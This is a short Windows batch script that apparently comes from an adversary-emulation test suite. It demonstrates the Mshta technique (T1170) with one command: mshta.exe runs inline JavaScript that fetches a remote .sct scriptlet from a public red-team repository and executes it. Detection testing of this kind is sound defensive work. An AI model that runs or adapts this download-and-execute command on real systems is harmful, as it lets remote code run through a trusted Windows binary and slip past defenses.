@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Mshta (T1170)
ECHO.
ECHO [+] Leveraging 'mshta.exe' to download and execute payload 
ECHO -------------------------------------------------------------------
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();
ECHO.
